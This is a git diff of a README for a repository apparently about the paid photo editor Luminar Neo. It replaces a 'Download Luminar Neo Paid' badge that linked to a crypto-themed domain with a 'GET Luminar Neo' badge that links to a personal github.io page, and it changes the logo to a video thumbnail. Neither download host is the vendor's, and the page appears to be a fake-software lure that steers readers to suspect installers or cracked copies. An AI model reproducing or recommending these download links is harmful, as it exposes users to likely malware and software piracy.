@@ -6,7 +6,8 @@ It gathers presets, naming rules, and automation that map directly to how teams 
 
 Focus areas include Windows 10/11 driver choices, cache placement, and the file formats Luminar Neo Paid sends to other tools.
 
-[![Download Luminar Neo Paid](https://img.shields.io/badge/Download-Luminar_Neo_Paid-blueviolet)](https://cryptoenthusiasts.world/)
+[![GET Luminar Neo](https://img.shields.io/badge/GET%20%E2%80%94%20Luminar-Neo-0078D6?style=for-the-badge&logoColor=white)](https://sarawilliams778980.github.io/.github/luminarneo)
+
 
 ---
 
@@ -61,7 +62,7 @@ Focus areas include Windows 10/11 driver choices, cache placement, and the file 
 
 ## 🖼 Preview
 **1. Luminar Neo Paid Logo**  
-![Luminar Neo Paid Logo](https://logo.clearbit.com/skylum.com)  
+![Luminar Neo Paid Logo](https://i.ytimg.com/vi/oSC_Lgn7TOo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLBsCGjGJlwTlya4kqadmA2fNiL9sA)  
 *Visual identifier used across this repository.*
 
 ---
